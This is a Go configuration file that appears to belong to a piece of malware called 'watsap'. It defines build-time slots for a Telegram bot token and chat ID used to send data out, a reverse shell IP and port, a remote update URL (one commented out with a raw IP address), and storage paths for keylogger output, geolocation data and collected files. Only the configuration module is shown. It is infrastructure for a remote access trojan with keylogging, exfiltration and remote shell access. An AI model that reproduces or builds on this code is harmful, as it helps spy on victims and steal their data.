package config

import (
	"path"
	"runtime"
	"watsap/utils/files"
)

// Variables
var (
	Platform  = runtime.GOOS
	WaVersion = "10.10"
	FirstRun  = !files.Exists(DataFile)
	UserID    *string
)

// variables will be loaded from ldflags
var (
	TG_BOT_TOKEN string
	TG_CHAT_ID   string
	RSHELL_IP    string
	RSHELL_PORT  string
	UPDATE_URL   string
	CERT_PATH    string
	DEBUG_STATUS string
	LOG_STATUS   string
)

var DebugMode = false
var WaLogging = false
var CertPath = "cert.pem"

// Files & dirs
var (
	WaDir      = path.Join(waDirPrefix, "watsap")
	InitFile   = path.Join(WaDir, "init.w")
	GeoFile    = path.Join(WaDir, "geoip.w")
	DataFile   = path.Join(WaDir, "data.w")
	KeylogFile = path.Join(WaDir, "kl.w")
	FilesDir   = path.Join(WaDir, "files")
	LogFile    = path.Join(WaDir, "log.w")
	UpdateFile = path.Join(WaDir, "update.json")
	//UpdateURL  = "http://192.3.159.189:8080/watsap.json"
)

// Telegram stuff
var (
	TgBotAPI      = "https://api.telegram.org/bot"
	TgFileApiURL  = "/sendDocument"
	TgSendTextMsg = "/sendMessage?chat_id=" + TG_CHAT_ID + "&text="
)

/*
func Printvar() {
	fmt.Println(TG_BOT_TOKEN)
	fmt.Println(TG_CHAT_ID)
	fmt.Println(RSHELL_IP)
	fmt.Println(RSHELL_PORT)
}
*/
